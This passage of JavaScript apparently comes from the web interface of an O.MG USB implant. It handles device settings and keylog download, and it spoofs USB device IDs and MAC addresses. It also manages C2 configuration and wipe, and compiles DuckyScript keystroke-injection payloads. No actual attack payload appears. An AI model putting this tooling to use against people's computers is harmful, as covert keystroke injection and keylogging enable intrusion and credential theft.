				dialog.removeAttribute("close", "");
			} else if (action === "close") {
				dialog.removeAttribute("open", "");
				dialog.setAttribute("close", "");
			} else if (action === "remove") {
				dialog.remove();
			} else {
				console.error("Invalid action:", action);
			}
		}

		function createDialog({
			id,
			title = '',
			description = '',
			action = null,
			closeEnabled = true
		}) {
			let dialog = document.getElementById(id);

			if (!dialog) {
				dialog = document.createElement('dialog');
				dialog.id = id;
				dialog.classList.add('general-dialog');

				if (closeEnabled) {
					const closeButton = document.createElement('button');
					closeButton.textContent = 'X';
					closeButton.classList.add('close-button');
					closeButton.addEventListener('click', () => {
						dialog.close();
					});
					dialog.appendChild(closeButton);
				}

				if (title) {
					const dialogTitle = document.createElement('h2');
					dialogTitle.textContent = title;
					dialog.appendChild(dialogTitle);
				}

				if (description) {
					const dialogDescription = document.createElement('div');
					dialogDescription.innerHTML = description;
					dialog.appendChild(dialogDescription);
				}

				if (action) {
					const dialogAction = document.createElement('button');
					dialogAction.textContent = action.text || 'OK';
					dialogAction.addEventListener('click', action.callback || (() => {}));
					dialog.appendChild(dialogAction);
				}

				document.body.appendChild(dialog);
			}

			if (!dialog.open) {
				dialog.showModal();
			}

			return dialog;
		}

		// Process Message Responses
		function processOnMessage(responseText) {
			lastMessage = Date.now();
			responseTextParams = responseText.split("\t");

			if (responseTextParams[0] != "CTList") {
				logMessage("DEBUG", `WebSocket Message Received: [response]:[${responseText}]`);
			}

			switch (responseTextParams[0]) {
				case responseTextParams[0].match(/\[custom\]/)?.input:
					apiResponseCustom(responseText);
					break;
				case responseTextParams[0].match(/\[CHStatus\]/)?.input:
					apiResponseCHStatus(responseText);
					break;
				case "CB":
				case "CC":
				case "CD":
				case "CEError":
				case "CFError":
				case "CFGet":
				case "CH":
				case "CK":
				case "CM":
				case "CNSet":
				case "CPStart":
				case "CQ":
				case "CR":
				case "CTErase":
				case "CTError":
				case "CTSet":
				case "CW":
				case "E":
				case "FB":
				case "FE":
				case "FM":
				case "FR":
				case "FW":
				case "FX":
				case "G":
				case "CLDelete":
				case "CLSetCursor":
					apiResponse(responseText);
					break;
				case responseTextParams[0].match(/CH Mode/)?.input:
					apiResponseCHStatus(responseText);
					break;
				case "C2Config":
					apiResponseC2Config(responseText);
					break;
				case "C2Info":
					apiResponseC2Info(responseText);
					break;
				case "C2Status":
					apiResponseC2Status(responseText);
					break;
				case "C2Wipe":
					apiResponseC2Wipe(responseText);
					break;
				case "CEStatus":
					apiResponseCEStatus(responseText);
					break;
				case responseTextParams[0].match(/CE/)?.input:
				case responseTextParams[0].match(/ce/)?.input:
					apiResponseCE(responseText);
					break;
				case "CFList":
					apiResponseCFList(responseText);
					break;
				case 'CI':
					apiResponseCI(responseText);
					break;
				case responseTextParams[0].match(/CJ/)?.input:
					apiResponseCJ(responseText);
					break;
				case responseTextParams[0].match(/\[dKAll\]/)?.input:
					downloadKeylog(responseTextParams);
					break;
				case responseTextParams[0].match(/CLRead/)?.input:
					apiRequestCLRead(responseText);
					break;
				case "CLStart":
					apiResponseCLStart(responseText);
					break;
				case "CLStatus":
					apiResponseCLStatus(responseText);
					break;
				case "CLStop":
					apiResponseCLStop(responseText);
					break;
				case "CNGet":
					apiResponseCNGet(responseText);
					break;
				case "CO":
					apiResponseCO(responseText);
					break;
				case "CPGet":
					apiResponseCPGet(responseText);
					break;
				case responseTextParams[0].match(/CS/)?.input:
					apiResponseCS(responseText);
					break;
				case "CTGet":
					apiResponseCTGet(responseText);
					break;
				case "CTList":
					apiResponseCTList(responseText);
					break;
				case responseTextParams[0].match(/CU/)?.input:
					apiResponseCU(responseText);
					break;
				case "CV":
					apiResponseCV(responseText);
					break;
				case responseTextParams[0].match(/CZ/)?.input:
					apiResponseCZ(responseTextParams[2]);
					break;
				case responseTextParams[0].match(/\[pL.*\]/)?.input:
					apiResponsePayloadLoad(responseTextParams[2]);
					break;
				case responseTextParams[0].match(/\[pS.*\]/)?.input:
					apiResponsePayloadSave(responseText);
					break;
				case responseTextParams[0].match(/\[sB.*\]/)?.input:
					apiResponseStatusBootSlot(responseTextParams[2]);
					break;
				case "CWInfo":
					apiResponseCWInfo(responseText);
					break;
				case "CWStatus":
					apiResponseCWStatus(responseText);
					break;
				case "E":
					break;
				case "SFRead":
					apiResponseSFRead(responseText);
					break;
				case responseTextParams[0].match(/\[.*\]/)?.input:
					logMessage(`CRIT`, `WebSocket MessageID: Unknown ID Handler. [response]:[${responseText}]`)
					break;
				default:
					logMessage(`CRIT`, `WebSocket Message Error: Could not be routed. [response]:[${responseText}]`)
					break;
			}
		}

		function issueCustomCommand() {
			const cmd = document.getElementById('customCommandInput').value;
			logMessage('INFO', `issueCustomCommand: [cmd]:[${cmd}]`);
			sendMessage(`[custom]${cmd}`);
		}

		function apiResponseCustom(data) {
			data = data.replace("[custom]", "");
			const {
				response,
				parameters
			} = parseData(data);

			logMessage('CRIT', `issueCustomCommand: [response]:[${response}] [parameters]:[${parameters}]`);
			updateElementValue('customCommandOutput', parameters, 'value');
		}

		let prevDataCTList = null;
		const apiResponseCTList = (data) => {
			if (data === prevDataCTList) {
				return;
			}
			prevDataCTList = data;
			let uicolorExists = false;
			let splitData = data.split('\t');
			let listName = splitData[0];
			let jsonData = splitData[1];
			let jsonObject = JSON.parse(jsonData);

			for (let key in jsonObject) {
				if (key == "bootpair") {
					bootpair = jsonObject[key];
					document.getElementById('bootscriptPair').value = bootpair;
				}

				if (key == "bootscript" && jsonObject[key] !== '0') {
					document.getElementById(`toggle-BootScript`).classList.add(`active`);
					document.getElementById(`payload-bootableToggle`).classList.add(`active`);
				}

				if (key == "bootscript" && jsonObject[key] == '0') {
					document.getElementById(`toggle-BootScript`).classList.remove(`active`);
					document.getElementById(`payload-bootableToggle`).classList.remove(`active`);
				}

				if (key == "wifimac") {
					hidxport = document.getElementById('device-CustomMACAddress');
					hidxport.value = jsonObject[key];
				}

				if (key == "hidxhost") {
					hidxhost = document.getElementById('hidxhost');
					hidxhost.value = jsonObject[key];
				}

				if (key == "hidxport") {
					hidxport = document.getElementById('hidxport');
					hidxport.value = jsonObject[key];
				}

				if (key == "hidxboot") {
					document.getElementById(`hidxboot`).classList.add(`active`);
					// activeClassElements.push(key);
				}

				if (key == "showmsgtime") {
					alwaysDisplayLastPoll = elementValue;
					const toggleElems = ['c2logAlwaysShow'];
					toggleElems.forEach((elemId) => {
						const toggleElem = document.getElementById(elemId);
						if (toggleElem) {
							if (elementValue !== '0') {
								toggleElem.classList.add('active');
							} else {
								toggleElem.classList.remove('active');
							}
						}
					});
				}

				if (key == "slotmode") {
					slotmode = jsonObject[key];
				}

				if (key == "uicolor") {
					customColor = document.getElementById('uicolorCustom');
					customColor.value = jsonObject[key];
					customColorSlider = document.getElementById('color-slider');
					customColorSlider.value = jsonObject[key];
					setAccentColors(jsonObject[key]);
					uicolorExists = true;
				}

				if (key == "usbinterval") {
					usbinterval = document.getElementById('experimentalSpeed');
					usbinterval.value = jsonObject[key];
				}
			}

			if (!uicolorExists) {
				const deviceModel = document.getElementById('device-Model').innerHTML;
				const deviceType = document.getElementById('device-Type').innerHTML;

				if (deviceModel == "c" && deviceType == "p") {
					setAccentColors("blue");
				} else {
					setAccentColors("red");
				}
			}
		}

		let globalJson = {};
		let resolveFunction = null;

		function apiResponseCFList(data) {
			const {
				response,
				parameters
			} = parseData(data);
			logMessage('DEBUG', `apiResponseCFList: [data]:[${response}]`);
			updateElement('response-CFList', response);
			const json = JSON.parse(parameters[1]);
			Object.assign(globalJson, json);
			if (parameters[3] !== "0") {
				sendMessage(`CFList\t${parameters[3]}`);
				return new Promise((resolve, reject) => {
					resolveFunction = resolve;
				});
			} else {
				processCFListData();
				if (resolveFunction) {
					resolveFunction();
					resolveFunction = null;
				}
				return Promise.resolve();
			}
		}

		function processCFListData() {
			const CFListResults = document.getElementById("CFListResults");
			CFListResults.innerHTML = "";
			const payloadList = document.getElementById("payload-list");
			payloadList.innerHTML = "";

			Object.entries(globalJson).forEach(([key, value]) => {
				const label = document.createElement("label");
				label.for = key;
				label.innerText = `cflist: ${key}`;

				const name = document.createElement("input");
				name.id = key;
				name.name = parseInt(value[0], 10);
				name.value = value[1];
				CFListResults.appendChild(label);
				CFListResults.appendChild(name);
				if (key.startsWith("payload")) {
					const option = document.createElement("option");
					option.value = key;
					payloadList.appendChild(option);
				}
			});

			let payloadSlotAvailable = 0;
			for (let key in globalJson) {
				if (key.startsWith("bootscript") || key.startsWith("payload") || key.startsWith("exec") || key.startsWith("keylog") || key.startsWith("<free>")) {
					payloadSlotAvailable += parseInt(globalJson[key][1]);
				}
			}
			updateElement('partitionEditorAvailable', payloadSlotAvailable);
			updateElement('response-CFList', JSON.stringify(globalJson));
			globalJson = {};
		}

		let prevDataCI = null;

		function apiResponseCI(data) {
			if (data === prevDataCI) {
				return;
			}
			prevDataCI = data;

			const {
				response,
				parameters
			} = parseData(data);

			if (parseFloat(parameters[6]) < previousUptime || parameters[1] !== previousMAC) {
				if (parameters[1] !== previousMAC && previousMAC != null) {
					toggleModalVisibility(true);

					const modalLabel = "Warning";
					const modalMessage = `Device MAC Address has changed. WebUI will reload in 10 seconds. If you did not intend this, check that you do not have multiple O.MG Devices operating on the same SSID and IP Address.`;

					setElementValues({
						"modalLabel": modalLabel,
						"modalMessage": modalMessage
					});

					setTimeout(function() {
						location.reload(true);
					}, 10000);
				}

				const elementIds = {
					'response-CI': {
						value: response,
						method: 'value'
					},
					'device-HardwareMACAddress': {
						value: parameters[1],
						method: 'innerHTML'
					},
					'device-FlashSize': {
						value: parameters[2],
						method: 'value'
					},
					'device-Uptime': {
						value: parameters[6],
						method: 'value'
					},
				};
				setElementValues(elementIds);

				const restartReasons = {
					'0': 'Normal Startup By Power On',
					'1': `Hardware Watchdog Reset ${parameters[4]} ${parameters[5]} ${parameters[7]} ${parameters[8]}`,
					'2': `Exception Reset ${parameters[4]} ${parameters[5]} ${parameters[7]} ${parameters[8]}`,
					'3': `Software Watchdog Reset ${parameters[4]} ${parameters[5]} ${parameters[7]} ${parameters[8]}`,
					'4': 'Software Restart',
					'5': 'Wake from Deep-Sleep',
					'6': 'External System Reset',
				};

				const restartReason = restartReasons[parameters[3]] || 'Unknown Restart Reason';
				logMessage('INFO', `Connection Established: [Uptime]:[${parameters[6]} seconds - ${restartReason}]`, 'Connection Established');
				viewDialog(`partitionApplied`, `close`);

				previousUptime = parseFloat(parameters[6]);
				previousMAC = parameters[1];
			}
		}

		let prevDataCNGet = null;

		function apiResponseCNGet(data) {
			if (data === prevDataCNGet) {
				return;
			}
			prevDataCNGet = data;

			const {
				response,
				parameters
			} = parseData(data);
			logMessage('CRIT', `apiResponseCNGet: [data]:[${response}]`);

			const elementIds = {
				'response-CNGet': {
					value: response,
					method: 'value'
				},
				'device-USBVID': {
					value: parameters[1],
					method: 'value'
				},
				'device-USBPID': {
					value: parameters[2],
					method: 'value'
				},
				'device-USBMAN': {
					value: parameters[3],
					method: 'value'
				},
				'device-USBPRO': {
					value: parameters[4],
					method: 'value'
				},
				'device-USBSER': {
					value: parameters[5],
					method: 'value'
				},
			};

			setElementValues(elementIds);
		}

		let intervalIdCPGet = null;

		function apiResponseCPGet(data) {
			const {
				response,
				parameters
			} = parseData(data);
			const isCPGet = response === "CPGet\t";

			setElementValues({
				'response-CPGet': isCPGet ? '' : response,
				'calibrationStatusViewer': isCPGet ? 'Generating Calibration Data. Please Wait.' : response
			});

			if (isCPGet && !intervalIdCPGet) {
				intervalIdCPGet = setInterval(() => sendMessage('CPGet'), 1000);
			} else if (!isCPGet && intervalIdCPGet) {
				clearInterval(intervalIdCPGet);
				intervalIdCPGet = null;
			}

			logMessage('CRIT', `apiResponseCPGet: [data]:[${response}]`);
		}

		async function readCalibrationText(event) {
			const file = event.target.files.item(0);
			const text = await file.text();
			calibrationData(text);
		}

		function calibrationData(data) {
			logMessage(`CRIT`, `CalibrationData: [file]:[${data}]`);
			sendMessage(`CO${data}`);
		}

		function apiResponseCO(data) {
			const {
				response,
				parameters
			} = parseData(data);

			toggleModalVisibility(true);

			const isSuccess = params[1] === "ok";
			const modalLabel = isSuccess ? "Calibration Success" : "Calibration Failed";
			const modalMessage = isSuccess ?
				`Calibration Succeeded. Please unplug and replug your O.MG Device to apply configuration.` :
				`Log Data: <${params}>`;

			setElementInnerHTML("modalLabel", modalLabel);
			setElementInnerHTML("modalMessage", modalMessage);

			if (isSuccess) {
				logMessage(`INFO`, `Calibration Succeeded. Please unplug and replug your O.MG Cable to apply configuration. Response: ${params}`);
				sendMessage(`CR1`);
			} else {
				logMessage(`INFO`, `Calibration Failed. Response: ${params}`);
			}

			parameters = response.split("\t");
			logMessage(`CRIT`, `apiResponseCO: [data]:[${response}]`);
			setElementInnerHTML("response-CO", response);
		}

		let prevDataCTGet = null;

		function apiResponseCTGet(data) {
			if (data === prevDataCTGet) {
				return;
			}
			prevDataCTGet = data;

			const {
				response,
				parameters
			} = parseData(data);
			logMessage('CRIT', `apiResponseCTGet: [data]:[${response}]`);
			setElementValues({
				'response-CTGet': response
			});

			const settingKey = parameters[1];
			const settingValue = parameters[2];

			const settingsMap = {
				wifimac: 'device-CustomMACAddress',
				uicolor: setAccentColors
			};

			if (settingsMap.hasOwnProperty(settingKey)) {
				const action = settingsMap[settingKey];
				typeof action === 'function' ? action(settingValue) : setElementValues({
					[action]: settingValue
				});
			} else {
				logMessage('CRIT', `CTGet does not have a handler for this setting. [key]:[${settingKey}] [value]:[${settingValue}]`);
			}
		}

		const apiResponseCV = (() => {
			previousData = null;

			return (data) => {
				if (data !== previousData) {
					const response = data;
					const parameters = response.split("\t");
					logMessage(`DIAG`, `apiResponseCV: [data]:[${response}]`);

					viewDialog('loadingScreen', 'close');

					const type = parameters[2].charAt(0);
					const model = parameters[2].charAt(1);
					const calibrationStatus = parameters[3].charAt(0);

					const typeData = processType(type);
					const modelData = processModel(model);

					applyFeatureFlags(type, model);

					if (['c', 'k', 'd', 'e'].includes(model)) {
						toggleClass('contentSubNav_payload', 'hidden', 'visible');
					}

					if (model === 'k' || model === 'e') {
						toggleClass('contentSubNav_keylog', 'hidden', 'visible');
					}

					if (calibrationStatus === '?' || calibrationStatus === '-' || calibrationStatus === '') {
						updateElementValue('modelText', 'ERROR', 'innerHTML');
						updateElementValue('device-CalibrationStatusDecoded', 'Calibration Error, Contact Support', 'innerHTML');
						contentAreaToggle('syslog');
						toggleClass('contentSubNav_payload', 'visible', 'hidden');
						logMessage(`CRIT`, '! ALERT: Device calibration not compatible with v2 firmware. You can initiate a free calibration upgrade, or downgrade to v1 firmware.');
						updateElementValue('navbarAlerts', '<button onclick="viewDialog(`calibrationerror`, `open`);">Calibration Error</button>', 'innerHTML');
						updateElementValue('device-TypeDecoded', 'Unknown Device', 'innerHTML');

						createDialog({
							id: 'calibrationerror',
							title: 'Calibration Error',
							description: `Device calibration not compatible with v2 or later firmware. You can initiate a free calibration upgrade, or downgrade to v1 firmware. For more details please see: <a href="https://github.com/O-MG/O.MG-Firmware/wiki/Calibration-Upgrade">Calibration-Upgrade Instructions</a><br /><br />
							<h2>Generate Hardware Profile</h2>
							<button class="submitButton" id="sidebar_settings_debug_CPStart" onclick="sendMessage('CPStart'); sendMessage('CPGet'); this.remove();">Generate Hardware Profile</button>
							<div id="calibrationStatusViewer"><br /><button class="submitButton" id="calibrationErrorDownloadButton" onclick="downloadFrontendlog();">Download Frontend Log</button></div>
							<form>
								<h2>Apply Calibration File:</h2>
								<input type="file" id="calibration" name="calibration" accept=".cal" onchange="readCalibrationText(event)">
								<div class="message-body">
									<p id="omg-calibration-text"></p>
									<p id="omg-calibration-log"></p>
								</div>
							</form>`,
							closeEnabled: true,
						});

						featureFlags = ['global', 'syslog', 'debug'];
						hideElementsByClass('payload', 'keylog', 'c2', 'hidx');
						toggleFeatureFlags();
					} else {
						const elementIds = {
							'response-CV': {
								value: response,
								method: 'value'
							},
							'frontend-VersionNumber': {
								value: frontendVersionNumber,
								method: 'innerHTML'
							},
							'device-VersionNumber': {
								value: parameters[1],
								method: 'innerHTML'
							},
							'device-Model': {
								value: parameters[2].charAt(0),
								method: 'innerHTML'
							},
							'device-Type': {
								value: parameters[2].charAt(1),
								method: 'innerHTML'
							},
							'device-CalibrationStatus': {
								value: parameters[3],
								method: 'value'
							},
							'device-TypeDecoded': {
								value: typeData[0] + ' ' + modelData[0],
								method: 'innerHTML'
							},
							'modelText': {
								value: modelData[1],
								method: 'innerHTML'
							},
							'device-CalibrationStatusDecoded': {
								value: 'Good',
								method: 'innerHTML'
							},
						};
						setElementValues(elementIds);
						fccID = parameters[4];
					}
					toggleFeatureFlags();

					previousData = data;
				}
			};
		})();

		let prevDataCWInfo = null;

		function apiResponseCWInfo(data) {
			if (data === prevDataCWInfo) {
				return;
			}
			prevDataCWInfo = data;
			const {
				response,
				parameters
			} = parseData(data);
			logMessage(`DIAG`, `apiResponseCWInfo: [data]:[${response}]`);

			const elementIds = {
				'response-CWInfo': {
					value: response,
					method: 'value'
				},
				'device-WIFIMode': {
					value: parameters[0],
					method: 'value'
				},
				'device-WIFISSID': {
					value: parameters[2],
					method: 'value'
				},
				'device-WIFIPassword': {
					value: parameters[3],
					method: 'value'
				},
				'device-WIFIChannel': {
					value: parameters[4],
					method: 'value'
				},
			};
			setElementValues(elementIds);

			if (parameters[1] === '2') {
				setRadioChecked('CW0');
			} else if (parameters[1] === '1') {
				setRadioChecked('CW1');
			} else {
				setRadioChecked('CW0');
			}
		}

		let prevDataCWStatus = null;

		function apiResponseCWStatus(data) {
			if (data === prevDataCWStatus) {
				return;
			}
			prevDataCWStatus = data;
			const {
				response,
				parameters
			} = parseData(data);

			ipAddressSplit = parameters[2].match(/.{1,2}/g);
			ipAddressDecimal = ipAddressSplit.reverse().map(hex => parseInt(hex, 16)).join('.');

			logMessage(`DEBUG`, `apiResponseCWStatus: [data]:[${response}]`);

			const elementIds = {
				'response-CWStatus': {
					value: response,
					method: 'value'
				},
				'device-IPAddress': {
					value: ipAddressDecimal,
					method: 'innerHTML'
				},
			};
			setElementValues(elementIds);
		}

		function updateUSBIDs() {
			const usbCommands = [
				`CTSet\tusbvid\t${document.getElementById("device-USBVID").value}`,
				`CTSet\tusbpid\t${document.getElementById("device-USBPID").value}`,
				`CTSet\tusbman\t${document.getElementById("device-USBMAN").value}`,
				`CTSet\tusbpro\t${document.getElementById("device-USBPRO").value}`,
				`CTSet\tusbser\t${document.getElementById("device-USBSER").value}`
			];

			sendCommands(usbCommands);

			logMessage(`INFO`, `! USB Device IDs Changed, Device will reboot.`);
			logMessage(`CRIT`, `ChangeUSBDeviceIDs: [usbvid]:[${document.getElementById("device-USBVID").value}] [usbpid]:[${document.getElementById("device-USBPID").value}] [usbman]:[${document.getElementById("device-USBMAN").value}] [usbpro]:[${document.getElementById("device-USBPRO").value}] [usbser]:[${document.getElementById("device-USBSER").value}]`);

			sendMessage(`CR1`);
		}

		function updateWifiSettings() {
			let mode = document.getElementById("CW1").checked ? 1 : 2;
			const wifiCommands = [
				`CTSet\twifimode\t${mode}`,
				`CTSet\twifissid\t${document.getElementById("device-WIFISSID").value}`,
				`CTSet\twifikey\t${document.getElementById("device-WIFIPassword").value}`,
				`CTSet\twifimac\t${document.getElementById("device-CustomMACAddress").value}`,
				`CR1`
			];

			sendCommands(wifiCommands);

			logMessage(`CRIT`, `ChangeWifiConfig: [cmd]:[${wifiCommands[0]}]:[${wifiCommands[1]}]`);
			logMessage(`INFO`, `! WiFi Config Changed, Device will now reboot!`);
		}

		function createLabelAndInput(labelText, commandName, idPrefix, parentId) {
			return new Promise((resolve) => {
				const parentElement = document.getElementById(parentId);

				if (!document.getElementById(`${idPrefix}${commandName}`)) {
					const labelName = document.createElement("label");
					labelName.htmlFor = `${idPrefix}${commandName}`;
					labelName.innerHTML = labelText;
					parentElement.appendChild(labelName);

					const inputName = document.createElement("input");
					inputName.id = `${idPrefix}${commandName}`;
					parentElement.appendChild(inputName);
				}
				resolve();
			});
		}

		async function generateDebugMenu() {
			const keylogCmdHandlerList = ['LiveLogStatus', 'Status', 'CaptureMode', 'SpaceUsed', 'SpaceFree', 'DataWaiting', 'OverflowCount', 'LastReportID', 'NextReportID'];
			const defaultCmdHandlerList = enabledFeatures;

			const mandatoryFields = ['CI', 'CV', 'CWInfo', 'CNGet', 'CWStatus', 'C2Config', 'C2Info', 'C2Status', 'C2Wipe'];
			for (let field of mandatoryFields) {
				await createLabelAndInput(field, field, 'response-', 'contentArea_debug');
			}

			const defaultCmdPromises = defaultCmdHandlerList.map((commandName) => {
				if (!mandatoryFields.includes(commandName)) {
					return createLabelAndInput(commandName, commandName, 'response-', 'contentArea_debug');
				}
			});

			const keylogCmdPromises = keylogCmdHandlerList.map((commandName) => {
				return createLabelAndInput(`Keylogger ${commandName}`, commandName, 'keylogger-', 'keyloggerStatus');
			});

			await Promise.all([...defaultCmdPromises, ...keylogCmdPromises]);
		}

		// Logger Module
		function logMessage(level, msg, toastOnly) {
			const debugLevels = {
				'NONE': 0,
				'INFO': 1,
				'WARN': 2,
				'CRIT': 3,
				'DIAG': 4,
				'DEBUG': 5
			};
			const datetime = new Date().toLocaleString();
			const debugLevel = document.getElementById('debugLevel').value;

			if (level !== "DEBUG" || level !== "NONE") {
				document.getElementById("debuglog").innerHTML += `LOG ${level} (${datetime}): ${msg}\n`;
				// console.log(msg);
			}

			if (debugLevels[level] <= debugLevels[debugLevel] && level !== "NONE") {
				document.getElementById("syslog").innerHTML += `[${level}]\t${msg}\n`;

				if (level === "INFO" && !msg.includes("onMessage")) {
					const toast = document.createElement('div');
					toast.className = 'toast';

					toast.innerHTML = toastOnly || msg;

					const removeToast = () => {
						if (document.body.contains(toast)) {
							document.body.removeChild(toast);
						}
					};

					const timeoutId = setTimeout(removeToast, 3000);
					toast.onclick = () => {
						clearTimeout(timeoutId);
						removeToast();
					};

					document.body.appendChild(toast);
				}
			}
		}

		// Payload Module
		function apiResponseCE(data) {}
		previousData = '';
		var iterations;
		split_payloads = "";
		compiledBootSlot = "";
		cePayload = "";
		var compiledBootSlot = "";
		var defaultDelay = "0";
		var defaultDelayJitter = "0";
		var defaultCharDelay = "0";
		var defaultCharDelayJitter = "0";
		var compileFailed = "0";

		function getPayload() {
			const payloadElement = document.getElementById("payload");
			return unescapeHtml(payloadElement.value);
		}

		function processPayload(payload) {
			let originalPayload = payload;
			let payloadLines = payload.split('\n');
			try {
				payload = sortLines(payload);
				payload = replaceFunctions(payload);
				payload = removeComments(payload);
				payload = replaceBlocksWithLines(payload);
				payload = replaceRepeat(payload);
				payload = replaceDefines(payload);
				payload = applyDelays(payload);
				payload = normalizeCommands(payload);
				logMessage(`CRIT`, `Compiling Payload - Intermediate Parsing: [script]:[${payload}]`);
				return payload;
			} catch (err) {
				let payloadLinesAfter = payload.split('\n');
				for (let i = 0; i < payloadLines.length; i++) {
					if (payloadLines[i] !== payloadLinesAfter[i]) {
						console.error(`Error on line ${i + 1}: ${payloadLines[i]}`);
						break;
					}
				}
				console.error(err);
				throw err;
			}
		}

		const SPECIAL_COMMANDS = new Set(["DEFINE", "FUNCTION", "IF_NOTPRESENT", "IF_PRESENT", "WAIT_FOR_NOTPRESENT", "WAIT_FOR_PRESENT", "STRING", "STRINGLN", "CTRL", "LCTRL", "LEFT-CTRL", "CONTROL", "LCONTROL", "LEFT-CONTROL", "SHIFT", "LSHIFT", "LEFT-SHIFT", "ALT", "LALT", "LEFT-ALT", "OPT", "LOPT", "LEFT-OPT", "OPTION", "LOPTION", "LEFT-OPTION", "CMD", "LCMD", "LEFT-CMD", "COMMAND", "LCOMMAND", "LEFT-COMMAND", "GUI", "LGUI", "LEFT-GUI", "WIN", "LWIN", "LEFT-WIN", "WINDOWS", "LWINDOWS", "LEFT-WINDOWS", "META", "LMETA", "LEFT-META", "SUPER", "LSUPER", "LEFT-SUPER", "RCTRL", "RIGHT-CTRL", "RCONTROL", "RIGHT-CONTROL", "RSHIFT", "RIGHT-SHIFT", "RALT", "RIGHT-ALT", "ROPT", "RIGHT-OPT", "ROPTION", "RIGHT-OPTION", "RCMD", "RIGHT-CMD", "RCOMMAND", "RIGHT-COMMAND", "RGUI", "RIGHT-GUI", "RWIN", "RIGHT-WIN", "RWINDOWS", "RIGHT-WINDOWS", "RMETA", "RIGHT-META", "RSUPER", "RIGHT-SUPER"]);

		function normalizeCommands(payload) {
			return payload.split('\n').map(line => {
				let [command, ...rest] = line.split(' ');
				if (!SPECIAL_COMMANDS.has(command.toUpperCase())) {
					rest = rest.map(item => item.toUpperCase());
				}
				return [command.toUpperCase(), ...rest].join(' ');
			}).join('\n');
		}

		function runDuckyScriptByLine() {
			payloadCompiled = compileDuckyScriptByLine();
			console.log(payloadCompiled);
		}

		function compileDuckyScriptByLine() {
			let payloadScript = getPayload();
			let payloadLines = payloadScript.split('\n');
			let payloadCompiled = "";
			console.log(payloadScript);

			for (let i = 0; i < payloadLines.length; i++) {
				let originalLine = payloadLines[i];
				try {
					let processedLine = processPayload(originalLine);
					let compiledLine = duckyscriptToBytecodeConverter(cleanInvisibles(processedLine));
					if (compiledLine !== undefined) {
						payloadCompiled += compiledLine + '\n';
					}

					console.log(`Compile Line ${i+1}: [input][${originalLine}] [output][${compiledLine}]`);
				} catch (err) {
					console.error(`Error on line ${i + 1}: ${originalLine}`);
					console.error(err);
					throw err;
				}
			}

			payloadCompiled = payloadCompiled.replace(/\s/g, '');
			payloadCompiled = payloadCompiled.toUpperCase();

			let payload1Size = document.getElementById("payload1") ? document.getElementById("payload1").value : '1';
			let payloadStoragePercent = (((payloadCompiled.length / 6) / (payload1Size * 4096)) * 100).toFixed(0) + '%';
			document.getElementById('payloadStorageUsedBar').style.width = payloadStoragePercent;
			document.getElementById('payloadStoragePercent').innerHTML = payloadStoragePercent;
			payloadCompiled = split_process(payloadCompiled);

			console.log(payloadCompiled);
			return payloadCompiled;
		}

		function compileDuckyScript() {
			payloadIntermediate = "";
			payloadScript = "";
			payloadLines = "";
			payloadCompiled = "";
			line = ""

			payloadScript = getPayload();
			payloadScript = processPayload(payloadScript);

			payloadLines = payloadScript.split('\n');
			payloadLines = payloadLines.map(cleanInvisibles);

			payloadCompiled = payloadLines.map(line => duckyscriptToBytecodeConverter(line)).join('\n');
			payloadCompiled = payloadCompiled.replace(/\s/g, '');
			payloadCompiled = payloadCompiled.toUpperCase();
			crc16 = crc16augccitt(payloadCompiled);

			let payload1Size = document.getElementById("payload1") ? document.getElementById("payload1").value : '1';
			let payloadStoragePercent = (((payloadCompiled.length / 6) / (payload1Size * 4096)) * 100).toFixed(0) + '%';
			document.getElementById('payloadStorageUsedBar').style.width = payloadStoragePercent;
			document.getElementById('payloadStoragePercent').innerHTML = payloadStoragePercent;
			payloadCompiled = split_process(payloadCompiled);

			return payloadCompiled;
		}

		function sortLines(input) {
			var lines = input.split('\n');
			var order = ['DUCKY_LANG', 'VID', 'PID', 'MAN', 'PRO', 'SER'];

			lines.sort((a, b) => {
				var aPrefix = a.split(' ')[0];
				var bPrefix = b.split(' ')[0];

				var aIndex = order.indexOf(aPrefix);
				var bIndex = order.indexOf(bPrefix);

				if (aIndex === -1 && bIndex === -1) return 0;
				if (aIndex === -1) return 1;
				if (bIndex === -1) return -1;

				return aIndex - bIndex;
			});

			return lines.join('\n');
		}

		function removeComments(payload) {
			payload = payload.replace(/^(?:REM).*$/gm, "");
			return payload.trim();
		}

		function cleanInvisibles(line) {
			return line.replace(/&nbsp;/g, ' ').trimEnd();
		}

		function replaceFunctions(payload) {
			const functionRegex = /^FUNCTION\s+([a-zA-Z0-9_]+)\((.*?)\)(?=\r?\n)([\s\S]*?)(?<=\r?\n)END_FUNCTION$/gm;
			let match;
			let functions = {};

			while ((match = functionRegex.exec(payload)) !== null) {
				const functionName = match[1];
				const functionParams = match[2] ? match[2].split(',').map(item => item.trim().replace(/^#/, '')) : [];
				const functionContent = match[3];

				functions[functionName] = {
					params: functionParams,
					body: functionContent
				};
			}

			payload = payload.replace(functionRegex, '');

			const functionReplacer = (match, functionName, args) => {
				if (functions[functionName] === undefined) {
					throw new Error(`Function ${functionName} is not defined`);
				}

				const argList = args.split(',').map(item => item.trim());
				let functionBody = functions[functionName].body;

				functionBody = functions[functionName].params.reduce((body, param, index) => {
					return body.replace(new RegExp('#?' + param, "g"), argList[index] || "");
				}, functionBody);

				return functionBody;
			};

			payload = payload.replace(/^([a-zA-Z0-9_]+)\(([^)]*)\)$/gm, functionReplacer);
			return payload;
		}

		function replaceDefines(payload) {
			const defineRegex = /^DEFINE\s+(#?[a-zA-Z0-9_]+)\s+(.*)$/gm;
			let match;
			let defines = {};

			while ((match = defineRegex.exec(payload)) !== null) {
				const keyName = match[1].replace(/^#/, '');
				const keyContent = match[2];
				defines[keyName] = keyContent;
			}

			payload = payload.replace(defineRegex, '');
			payload = payload.replace(/^\s*[\r\n]/gm, '');

			const keys = Object.keys(defines);
			if (keys.length > 0) {
				const defineReplacerRegex = new RegExp('#?(' + keys.join('|') + ')', 'g');

				const defineReplacer = (match) => defines[match.replace(/^#/, '')] || match;
				payload = payload.replace(defineReplacerRegex, defineReplacer);
			}
			return payload;
		}

		function replaceRepeat(payload) {
			const lines = payload.split('\n');
			let newLines = [];

			lines.forEach(line => {
				if (line.startsWith("REPEAT")) {
					let splitLine = line.split(' ');
					let count = parseInt(splitLine[1]);
					let command = splitLine.slice(2).join(' ');

					newLines.push(...Array(count).fill(command));
				} else {
					newLines.push(line);
				}
			});

			return newLines.join('\n');
		}

		function replaceBlocksWithLines(payload) {
			const blockRegex = /^(\w+)_BLOCK\n([\s\S]*?)\nEND_\1/gm;

			let match;
			while ((match = blockRegex.exec(payload)) !== null) {
				const command = match[1];
				const blockContent = match[2];
